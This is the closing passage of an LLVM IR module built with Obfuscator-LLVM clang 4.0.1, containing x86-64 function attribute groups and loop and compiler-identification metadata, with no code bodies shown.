attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2}
!2 = !{!"llvm.loop.unroll.disable"}
!3 = distinct !{!3, !2}
!4 = !{i32 -2146816818}
!5 = !{i32 -2146816409}
!6 = distinct !{!6, !2}
